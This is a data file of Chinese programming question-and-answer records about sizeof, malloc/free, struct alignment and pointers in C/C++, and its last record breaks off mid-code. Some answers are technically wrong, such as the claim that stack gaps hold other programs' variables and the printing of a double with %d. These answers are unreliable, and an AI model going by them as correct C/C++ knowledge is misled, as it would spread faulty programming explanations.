{"Answer": "&lt;p&gt;stu s1已经分配内存了&amp;#xff0c;get返回的是值&amp;#xff0c;不是指针&amp;#xff0c;因此你free的不是一个指针变量。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在C语言中如何正确释放内存？", ["今天用C语言写了一个小程序，但无法正确释放内存。程序如下：", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n\n", "typedef", " ", "struct", " ", "stu", " {\n    ", "char", " name;\n    ", "int", " age;\n    ", "char", " sex;\n} stu;\n  \n", "stu ", "get", "()", " ", "{\n    stu* p = (stu*)", "malloc", "(", "sizeof", "(stu));\n    p->name = ", "'A'", ";\n    ", "return", " *p;\n}\n\n", "void", " ", "freestu", "(stu p)", " ", "{\n    ", "free", "(&p);\n}\n\n", "int", " ", "main", "()", " ", "{\n     stu s1 = ", "get", "();\n      ", "printf", "(", "\"name:%c\\n\"", ",s1.name);\n      ", "freestu", "(s1);\n    ", "return", " ", "0", ";\n}\n", "\n", "在Linux编译结果如下：", "\n", "\n", "运行出现错误：", "\n", "\n", "谁知道为什么？", "求解。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;主要看操作系统&amp;#xff0c;64位系统&amp;#xff0c;这个位数指的是CPU 里面的通用寄存器的数据宽度为64位&amp;#xff0c;也就是说一个地址占二进制位数是64&amp;#xff0c;所以&amp;#xff1a;&lt;/p&gt;\n&lt;p&gt;sizeof(double *)&amp;#61;&amp;#61;sizeof(int *)&amp;#61;&amp;#61;sizeof(char *)&amp;#61;&amp;#61;64/8&amp;#61;&amp;#61;8&lt;/p&gt;\n&lt;p&gt;32位系统&amp;#xff0c;同理&amp;#xff0c;他的一个地址占32位二进制空间&amp;#xff0c;sizeof(double *)&amp;#61;&amp;#61;sizeof(int *)&amp;#61;&amp;#61;sizeof(char *)&amp;#61;&amp;#61;32/8&amp;#61;&amp;#61;4&lt;br /&gt;所以指针大小为8&amp;#xff0c;int 类型为4&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["vscode指针大小问题", ["\n", "#", "include", "<stdio.h>", "\n", "int", " ", "main", "()", "\n", "{\n    ", "int", " *p;\n    ", "int", " q;\n    ", "printf", "(", "\"%d\\n\"", ",", "sizeof", "(p));\n    ", "printf", "(", "\"%d\"", ",", "sizeof", "(q));\n    ", "return", " ", "0", ";\n}\n", "\n", "\n", "int 类型和指针不是应该一样大吗，为什么一个是8一个是4呢？有没有人可以解释一下这个原因"]], "Tag": "程序设计"}
{"Answer": "&lt;ol&gt;&lt;li&gt;你定义了两个变量&amp;#xff0c;都是栈上的&amp;#xff0c;一个是t&amp;#xff0c;一个t2&lt;/li&gt;&lt;li&gt;你定义的两个是结构体变量&amp;#xff0c;内存是连续的&lt;/li&gt;&lt;li&gt;内存对齐是按8个byte 对齐&amp;#xff0c;所以&amp;#xff0c;结构体变量占用的内存时 24个Bytes&amp;#xff0c;其中int a&amp;#xff1b;和 short b&amp;#xff1b;共用第一个8bytes&amp;#xff1b;&lt;/li&gt;&lt;li&gt;变量t 的内存地址是&amp;#xff1a;0x1fd77ff7c0&amp;#xff0c;变量t2 的内存地址是&amp;#xff1a;0x1fd77ff7e8&lt;br /&gt;ok~~~~下面来解决你提的两个问题。。。。&lt;/li&gt;&lt;/ol&gt;\n&lt;p&gt;第一个&amp;#xff0c;当你定义变量t 并初始化它的时候&amp;#xff0c;系统不是只有你这一个程序&amp;#xff0c;后面还有别的程序在跑&amp;#xff0c;那么就有可能同时申请内存&lt;br /&gt;这样&amp;#xff0c;0x1fd77ff7c0 刚分配给了 t的同时&amp;#xff0c;0x1fd77ff7d8 这个内存给了另外一个程序的变量了。&lt;br /&gt;所以&amp;#xff0c;出现了&amp;#xff0c;你看到的t 和 t2 不连续的情况。。。。&lt;br /&gt;第二个&amp;#xff0c;当你定义一个变量t 或者 t2 的时候&amp;#xff0c;系统会分配一个连续的内存给你&amp;#xff0c;但是&amp;#xff0c;这个内存之前是谁用的&amp;#xff0c;你不清楚&amp;#xff0c;你唯一清楚的时候&amp;#xff0c;这个内存别人之前用过了&amp;#xff0c;并且释放了。。。。&lt;br /&gt;那么&amp;#xff0c;这个刚被变量t 拿到的内存&amp;#xff0c;就有可能之前被别人填充过数据&amp;#xff0c;所以&amp;#xff0c;当前看到蓝色框中的部分是脏数据&amp;#xff0c;很正常&amp;#xff0c;也无所谓&amp;#xff0c;因为你在引用的时候都是通过变量t 或t2 引用其成员变量&amp;#xff0c;是访问不到这一块数据。。。。&lt;br /&gt;同理&amp;#xff0c;如果是堆上申请的内存&amp;#xff0c;也是如此的。。。&lt;br /&gt;但是&amp;#xff0c;建议你在使用变量的时候&amp;#xff0c;统统都初始化一下&amp;#xff0c;例如memset 函数&lt;/p&gt;\n&lt;p&gt;希望对你有所帮助&amp;#xff0c;如果有其他的问题&amp;#xff0c;欢迎随时交流~~~~&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++内存对齐的疑惑", ["问题遇到的现象和发生背景", "\n", "在看C++的内存对齐，随便写了个例程，遇到了些疑惑的问题，找了资料看也还是很疑惑：", "代码：", "\n", "struct", " test {\n    ", "int", " a; ", "// 4B", "\n    ", "short", " b; ", "// 2B", "\n    ", "long", " ", "long", " c; ", "// 8B ", "\n    ", "int", " d; ", "// 2B", "\n};\n​", "int", " ", "main", "(", ")", " {\n    test t{", "0", ", INT16_MAX, ", "0", ", INT_MAX};\n    test t2{INT_MAX, ", "0", ", INT64_MAX, ", "0", "};\n    cout << ", "sizeof", "(", "struct", " test) << endl;\n    ", "return", " ", "0", ";\n}\n", "\n", "test结构体大小为24B；又用GDB看了一下内存", "\n", "(gdb) x /64xb &t2\n", "0x1fd77ff7c0", ":    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0x7f", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "\n", "0x1fd77ff7c8", ":    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0x7f", "\n", "0x1fd77ff7d0", ":    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x1f", "    ", "0x00", "    ", "0x00", "    ", "0x00", "\n", "0x1fd77ff7d8", ":    ", "0x08", "    ", "0x19", "    ", "0x81", "    ", "0x0f", "    ", "0xf6", "    ", "0x7f", "    ", "0x00", "    ", "0x00", "\n", "0x1fd77ff7e0", ":    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0xff", "    ", "0x7f", "    ", "0x00", "    ", "0x00", "\n", "0x1fd77ff7e8", ":    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "\n", "0x1fd77ff7f0", ":    ", "0xff", "    ", "0xff", "    ", "0xff", "    ", "0x7f", "    ", "0xf6", "    ", "0x7f", "    ", "0x00", "    ", "0x00", "\n", "0x1fd77ff7f8", ":    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "    ", "0x00", "\n", "\n", "\n", "有这么两个疑惑的地方：", "\n", "t和t2应该都是位于stack区，倒确实是按内存从高位到低位存的，但不是说stack区的内存分配是连续的吗？中间那一段", "0x08 0x19 ... 0x00", "是什么？", "按照内存对齐规则，test结构体长度得是有效对齐值的整数倍，这里是8，所以到最后的int d结束以后(20B)还得再补4B，使得结构体大小为24B，这4B填充的内容是随便填的吗？（图中蓝色框）", "\n", "希望有人能帮忙解答，万分感谢"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;首先&amp;#xff0c;sizeof是一个操作符,也是关键字&amp;#xff0c;就不是一个函数&amp;#xff0c;这和strlen()不同&amp;#xff0c;strlen()是一个函数。&lt;/p&gt;\n&lt;p&gt;sizeof(a)是会检测到a是一个数组的类型&amp;#xff0c;可以获取到数组声明时设置的长度信息&amp;#xff0c;直接返回a这个数组类型所占的内存字节数。而不像函数需要传递a的首地址。&lt;br /&gt;而sizeof(a&amp;#43;0)就只能检测到是一个int类型地址&amp;#xff0c; 就无法获取到数组声明时设置的长度信息了&lt;/p&gt;\n&lt;p&gt;如有帮助&amp;#xff0c;望采纳&amp;#xff01;谢谢! 点击我这个回答&lt;strong&gt;右上方的【采纳】&lt;/strong&gt;按钮&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言sizeof运用问题混淆", ["int a[3]={1,2,3};   arr是首元素地址，那sizeof(a)为什么是数组的大小，而sizeof（a+0）为地址的大小"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;\n&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;\nint main()\n{\n\tint a,b;\n\ta &amp;#61; sizeof(3&amp;#43; 5.0); /*3&amp;#43;5.0 是一个double型数&amp;#xff0c;整形的大小是8*/\n\tb &amp;#61; sizeof 3 &amp;#43; 5.0; /* 3是整型&amp;#xff0c;大小是4,4&amp;#43;5.0 取整是9*/\n\tprintf(&amp;#34;%d,%d,%d\\n&amp;#34;,a,b,sizeof(&amp;#34;china&amp;#34;)); /*sizeof(&amp;#34;china&amp;#34;)&amp;#61;6,5个字符&amp;#43;一个\\0 */\n\treturn 0;\n}\n\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;结果是8,9,6&lt;/p&gt;\n\n&lt;p&gt;题目2&amp;#xff1a;&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;\nint main()\n{\n\tfloat x &amp;#61; 7.12;\n\tint a &amp;#61; 5,b;\n\tb &amp;#61; (int)x%a; /*x取整是7,7除以5取余数是2*/\n\tprintf(&amp;#34;b&amp;#61;%d\\n&amp;#34;,b);\n\tprintf(&amp;#34;x&amp;#61;%f\\n&amp;#34;,x);\n\treturn 0;\n}&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;结果是&amp;#xff1a;&lt;/p&gt;\n\n&lt;p&gt;b&amp;#61;2&lt;/p&gt;\n\n&lt;p&gt;x&amp;#61;7.120000&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求大神这两个题该怎么完成", ["\n\n", " "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;有帮助望采纳&lt;/strong&gt;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;// #include &amp;lt;math.h&amp;gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;memory.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; *a &amp;#61; &lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;10&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, a &amp;#43; i);\n    }\n\n    a &amp;#61; &lt;span class=\"hljs-built_in\"&gt;realloc&lt;/span&gt;(a, &lt;span class=\"hljs-number\"&gt;20&lt;/span&gt; * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;));\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;scanf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, a &amp;#43; i);\n    }\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;20&lt;/span&gt;; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d &amp;#34;&lt;/span&gt;, *(a &amp;#43; i));\n    }\n    &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(a);\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中内存分配函数", ["（1）用malloc或calloc函数分配一个能存储10个整型数的存储空间；", "提示：p=(int*)malloc(10", "sizeof(int));", "（2）通过scanf函数向（1）中分配的存储空间输入10个整数；", "（3）再通过realloc函数将先前分配的空间扩容为可存储20整型数的大小；", "提示：p=(int", ")realloc(p,20*sizeof(int));", "（4）向扩容后的空间中再输入另外的10个整数；", "（5）用printf函数输入所有的整数；", "（6）最后用free函数释放存储空间。"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;This is because of padding added to satisfy alignment constraints. &lt;a href=\"http://en.wikipedia.org/wiki/Data_structure_alignment\" rel=\"noreferrer\"&gt;Data structure alignment&lt;/a&gt; impacts both performance and correctness of programs:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;Mis-aligned access might be a hard error (often &lt;code&gt;SIGBUS&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Mis-aligned access might be a soft error.\n\n&lt;ul&gt;\n&lt;li&gt;Either corrected in hardware, for a modest performance-degradation.&lt;/li&gt;\n&lt;li&gt;Or corrected by emulation in software, for a severe performance-degradation.&lt;/li&gt;\n&lt;li&gt;In addition, atomicity and other concurrency-guarantees might be broken, leading to subtle errors.&lt;/li&gt;\n&lt;/ul&gt;&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Here's an example using typical settings for an x86 processor (all used 32 and 64 bit modes):&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;struct X\n{\n    short s; /* 2 bytes */\n             /* 2 padding bytes */\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 3 padding bytes */\n};\n\nstruct Y\n{\n    int   i; /* 4 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n    short s; /* 2 bytes */\n};\n\nstruct Z\n{\n    int   i; /* 4 bytes */\n    short s; /* 2 bytes */\n    char  c; /* 1 byte */\n             /* 1 padding byte */\n};\n\nconst int sizeX = sizeof(struct X); /* = 12 */\nconst int sizeY = sizeof(struct Y); /* = 8 */\nconst int sizeZ = sizeof(struct Z); /* = 8 */\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;One can minimize the size of structures by sorting members by alignment (sorting by size suffices for that in basic types) (like structure &lt;code&gt;Z&lt;/code&gt; in the example above).&lt;/p&gt;\n\n&lt;p&gt;IMPORTANT NOTE: Both the C and C++ standards state that structure alignment is implementation-defined.  Therefore each compiler may choose to align data differently, resulting in different and incompatible data layouts.  For this reason, when dealing with libraries that will be used by different compilers, it is important to understand how the compilers align data.  Some compilers have command-line settings and/or special &lt;code&gt;#pragma&lt;/code&gt; statements to change the structure alignment settings.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么结构体的 sizeof 不等于每个成员 sizeof 的总和？", ["\n\n", "Why does the ", "sizeof", " operator return a size larger for a structure than the total sizes of the structure's members?", "\n    ", "\n\n", "转载于:https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member"]], "Tag": "程序设计"}
{"Answer": "char *p=\"abcd\"; 是直接指向字符串首字母的存储地址，但p是以const存在的，printf(\"%c\",p[2]);是读取它没问题，但不能修改，否则程序会崩溃；\r\n\r\n第二种\r\n```\r\nchar *p;\r\n\r\ngets(p);\r\n\r\nprintf(\"%c\",p[2]);\r\n```\r\n系统随机分配空间给p，也就是不确定的地址。如果你直接对它赋值，在一个无法预知的地址写入数据，很可能会出现程序崩溃。\r\n而malloc，是向系统申请动态内存，绑定真正的内存空间。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["小白，字符指针内存分配的问题，希望大佬帮忙解答一下", ["对于这样的情况：", "\n\n", "char *p=\"abcd\";", "\n\n", "printf(\"%c\",p[2]);", "\n\n", "结果就可以正常输出结果c", "\n\n", "可是对于这样的情况：", "\n\n", "char *p;", "\n\n", "gets(p);", "\n\n", "printf(\"%c\",p[2]);", "\n\n", "输入字符串“abcd”，结果却无法输出结果，", "\n\n", "这时需要用malloc函数为指针p分配内存，在定义指针下面加p=(char *)malloc(10*sizeof (char));就可以输出结果c了。", "\n\n", "为什么第一种情况不需要分配内存，指针直接指向字符串首字母的存储地址，第二种却必须要分配内存呢？", "\n\n", "新手，求大佬带，谢谢！"]], "Tag": "程序设计"}
{"Answer": "对于一维“数组”\r\n数组的实现是在栈上申请连续的内存区间，malloc是在堆上申请一个连续的内存区间，可以用[]来操作，但是并非数组。\r\n（以后你会慢慢发现很多基础概念不能混淆）\r\n\r\n对于回收后可以访问的话，可以看下帖。简言之，只是通知系统这块内存释放了，系统根据自己的算法决定何时回收。\r\nhttp://bbs.chinaunix.net/thread-1396686-1-1.html\r\n\r\n当然自己通知了系统不用了，就应该保证不用这块内存了，所以释放后立即p1 = NULL是基本的变成规范。\r\n\r\n对于二维“数组”\r\n其实这个问题就出在数组的理解上，这边只是申请一个连续的区域，区域的每个值也指向另外的一篇连续的区域\r\n其实这里所有的区域并不一定是连续的（p2[0]和p2[1]指向的区域是堆的随机分配的），而真正的二维数组是连续的栈上的区域\r\n\r\n然后回答你的问题\r\n【1】=&gt;p1是系统还没有来回收，p2的话，抱歉，身边没有环境，我理解是应该可能系统对于是当前域内（{}中）是执行完了再回收。\r\n实际上应用上是没有人这么写代码的，因为指针释放后还在用的话是被批了多少年的问题了。。。\r\n【2】=&gt;根本没有这样的需求，已经释放掉东西还要去检查就是要用到了，这是矛盾的。\r\n如果真有这样的要求（为了防止内存泄漏），我觉得你可以去看看智能指针的使用或者自己实现内存申请和释放", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc动态创建一维、二维数组，内存释放的问题", [" //////////////c用malloc和free//////////////////////////////\n#include   \"stdio.h\"   \n#include <iostream>\nusing namespace std;\n\n//***********使用malloc创建一维数组，初始化、打印和释放***********\n#define MALLOC_1D(p1,len,TYPE) p1 = (TYPE *)malloc(len * sizeof(TYPE));\n\n#define FREE_1D(p1) free(p1);\n\ntemplate<typename TYPE>\nvoid MALLOC_1D_INIT(TYPE *p1, int len, TYPE value = 0) {\n    for (int i = 0; i<len; i++)\n            p1[i] = value;\n}\n\n\ntemplate<typename TYPE>\nvoid PRINT_1D(TYPE *p1, int len) {\n    for (int i = 0; i < len; i++) {\n            cout << p1[i] << \",\";\n    }\n    cout << endl;\n}\n\n//***********使用malloc创建二维数组，初始化、打印和释放***********\n#define MALLOC_2D(p2,row,col,TYPE)\\\np2 = (TYPE**)malloc(sizeof(TYPE*) *row);\\\nfor (int i = 0; i < row; i++)\\\n    p2[i] = (TYPE*)malloc(sizeof(TYPE) * col);\n\n\n#define FREE_2D(p2,row,col)\\\n    for (int i = 0; i<row; i++)\\\n        free(p2[i]);\\\n    free(p2);\n\n\ntemplate<typename TYPE>\nvoid MALLOC_2D_INIT(TYPE **p2, int row, int col, TYPE value=0) {\n    for (int i = 0; i<row; i++)\n        for (int j = 0; j<col; j++)\n        {\n            p2[i][j] = value;\n        }\n}\n\ntemplate<typename TYPE>\nvoid PRINT_2D(TYPE **p2, int row, int col) {\n    for (int i = 0; i < row; i++) {\n        for (int j = 0; j<col; j++)\n        {\n            cout << p2[i][j] << \",\";\n        }\n        cout << endl;\n    }\n    cout << endl;\n}\n\n\nvoid   main()\n{\n\n    int row = 3;\n    int col = 5;\n    int cha = 4;\n    //一维数组\n    int *p1;\n    MALLOC_1D(p1, row, int);//开辟数组空间\n    MALLOC_1D_INIT(p1, row);//数组初试化\n    PRINT_1D(p1, row);//打印\n    FREE_1D(p1);//释放空间\n    cout << \" p1[0]=\"<<p1[0] << endl;//【1】明明free释放了，为什么还可以访问内存？\n\n    //二维数组\n    int **p2;\n    MALLOC_2D(p2, row, col, int);//开辟数组空间\n    MALLOC_2D_INIT(p2, row, col);//数组初试化\n    PRINT_2D(p2, row, col);//打印\n    FREE_2D(p2, row, col);//释放空间\n    //cout << \" p2[0][0]=\" << p2[0][0] << endl;//【2】free释放了,不能访问了,去掉注释出错！\n    system(\"pause\");\n}\n\n", "\n\n", "我的问题是：", "\n【1】malloc创建的一维数组，明明free释放了，为什么还可以访问内存？是我没有成功释放内存麽？而我malloc创建的二维数组，free释放了后不能访问了", "\n【2】如何检测自己malloc动态开辟的空间，被成功free了？"]], "Tag": "程序设计"}
{"Answer": "a[1000000]; //如果是vc，此行就会报错\r\n在栈上申请1000000个整型，需要申请内存4000000字节，合3.81M\r\nvc默认栈大小为1M，所以内存是不够的，申请不到那么多内存，所以在a[1000000];就会报错。\r\n如果是linux，栈大小默认为8M，就可以申请那么多的整型。\r\n\r\n对于memset的这两行是没有区别的，两行的效果是一样。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["sizeof(数组名)与sizeof(类型)*(数组大小)的区别", ["今天在写代码时用到了memset这个函数，发现如果定义一个int型数组", "\n\n", "a[1000000]，", "\n\n", "使用memset进行初始化的时候第一种写法程序死机，第二种就能通过：", "\n\n", "(1) memset(a, 0, 1000000*sizeof(int))", "\n\n", "(2) memset(a, 0, sizeof(a))", "\n\n", "请问这是为什么？这两种写法有什么区别？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;原因&amp;#xff1a;传入的实参为局部变量没有被保护。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["malloc申请内存后，另一个指针指向的内容被更改", ["######malloc申请内存后，函数的一个指针实参地址没变，但是指向的内容被破坏了", "\n", "\n", "List_S* Init_S(", "char", "* s)\n{\n    ", "char", "* a = s;\n    List_S* ", "temp", " = (List_S*)malloc(sizeof(List_S));\n    ", "char", "* b = s;\n    ", "temp", "->next = ", "NULL", ";\n    ", "temp", "->data.s = s;\n    printf(\"%s\", s);\n    printf(\"\\n%s\", ", "temp", "->data.s);\n    ", "temp", "->data.list = ", "NULL", ";\n    ", "return", " ", "temp", ";\n}\n\n", "\n", "malloc前", "\n", "\n", "malloc后", "\n", "\n", "调试过后发现指针是在malloc后发生的问题", "\n", "想问问这是什么类型的问题，如何解决和避免"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof是C语言的一个运算符,不是函数&amp;#xff0c;虽然用法很像函数&amp;#xff0c;sizeof的作用是用来返回()里面的变量或者数据类型占用的内存字节数。&lt;br /&gt;函数形参是数组时&amp;#xff0c;实际传递的不是整个数组&amp;#xff0c;而是数组的首元素首地址。也就是说函数传参用数组来传&amp;#xff0c;实际相当于传递的是指针&amp;#xff08;指针指向数组的首元素首地址&amp;#xff09;。&lt;/p&gt;\n&lt;p&gt;所以你 walk 是指针&amp;#xff0c;不是数组&amp;#xff0c;&lt;br /&gt;只有sizeof(数组名)操作的是数组时,才能返回整个数组所占用的内存空间&amp;#xff08;以字节为单位的&amp;#xff09;。&lt;br /&gt;如果sizeof(指针)操作的是指针,返回是指针本身所占用的内存空间&amp;#xff0c;在32位系统上&amp;#xff0c;不管指针p指向的是整型数据&amp;#xff0c;还是字符型数据&amp;#xff0c;short型数据&amp;#xff0c;long型数据等&amp;#xff0c;指针本身所占的内存字节数均为4。&lt;br /&gt;如果要在函数中用到数组长度就只能在函数外面获取数组长度再传到函数里。&lt;/p&gt;\n&lt;p&gt;参考&lt;br /&gt;&lt;a href=\"https://blog.csdn.net/baidu_41388533/article/details/106744846\" id=\"textarea_1636480910945_1636481839898_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;C指针之指针、数组与sizeof运算符_baidu_41388533的博客-CSDN博客&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;指针、数组与sizeof运算符sizeof是C语言的一个运算符\t主要sizeof不是函数&amp;#xff0c;虽然用法很像函数&amp;#xff0c;sizeof的作用是用来返回()里面的变量或者数据类型占用的内存字节数。\t\tsizeof存在的价值\t主要是因为在不同平台下各种数据类型所占的内存字节数不尽相同&amp;#xff08;譬如int在32位系统中为4字节&amp;#xff0c;在16位系统中为2字节···&amp;#xff09;。\t\t所以程序中需要使用sizeof来判断当前变量/数据类型在当前环境下占几个字节。\t\tchar str[] &amp;#61; ”hello”; sizeof(str)...&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;img class=\"md_link_img\" id=\"md_link_img\" src=\"https://g.csdnimg.cn/static/logo/favicon32.ico\" /&gt;\n        &lt;span class=\"flex-1\"&gt;\n          &lt;span class=\"md_link_url\"&gt;https://blog.csdn.net/baidu_41388533/article/details/106744846&lt;/span&gt;\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;br /&gt;&lt;a href=\"https://www.jianshu.com/p/bd6dc60e9e24\" id=\"textarea_1636480910945_1636481839898_1\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;别混淆了sizeof(数组名)和sizeof(指针) - 简书&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;本文著作权声明&amp;#xff1a;请务必阅读个人介绍部分&amp;#xff01; 我们在挨个儿输出一个数组中的元素时&amp;#xff0c;最常用的就是用一个for循环来实现&amp;#xff0c;简单了事。比如类似下面的代码片段&amp;#xff1a; 用一个下标索引变量i来遍...&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;span class=\"md_link_img icon iconfont icon-lianjie\"&gt;&lt;/span&gt;\n        &lt;span class=\"flex-1\"&gt;\n          &lt;span class=\"md_link_url\"&gt;https://www.jianshu.com/p/bd6dc60e9e24&lt;/span&gt;\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;br /&gt;&lt;strong&gt;如有帮助&amp;#xff0c;望采纳&amp;#xff01;谢谢!&lt;/strong&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于sizeof，怎么记录const char*", ["新人刚学😭如何对walk计数，这样用似乎不对，我试了用n=sizeof(walk)/sizeof(char);还是不行，正常来说n应该等于10的。"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;pragma&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;warning&lt;/span&gt;(disable : 4996)&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a[] &amp;#61; {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;};\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; k;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; m, n;\n    &lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; 